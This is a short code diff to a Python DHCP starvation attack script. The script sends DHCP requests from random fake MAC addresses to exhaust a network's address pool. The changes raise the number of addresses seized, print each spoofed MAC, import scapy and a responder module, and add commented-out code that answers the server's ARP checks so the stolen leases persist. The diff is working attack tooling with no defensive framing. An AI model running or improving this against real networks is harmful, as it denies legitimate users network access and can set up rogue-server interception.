@@ -9,12 +9,14 @@ White = "\033[0m"
 # Import modules
 import fct_random
 import fct_dhcp
+import fct_responder
+import scapy.all as scapy
 import time
 
 def starvation(free_ip, interface):
 
     reserved_IP = []
-    cpt = (len(free_ip) - 2)
+    cpt = (len(free_ip) - 10)
 
     while len(free_ip) > cpt:
         
@@ -24,6 +26,7 @@ def starvation(free_ip, interface):
         mac = fct_random.valid_mac()
 
         # DHCP Discover
+        print (f"\nFake MAC is : {mac}\n")
         sniff_packet = fct_dhcp.listener(mac)
         fct_dhcp.discover(mac, hostname, xid, interface)
         # DHCP Offer
@@ -35,6 +38,11 @@ def starvation(free_ip, interface):
         # DHCP Ack
         dhcp_ack = fct_dhcp.listener_join(sniff_packet)
         ack_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)
+
+        # ARP request from DHCP Server
+        #sniff_packet = scapy.sniff(count=1, filter=f"arp and arp[6:2] = 1 and host {ack_ip}", timeout=10)
+        #if sniff_packet:
+        #    fct_responder.responder(sniff_packet, ack_mac, interface)
 
         # Output
         if ack_ip:
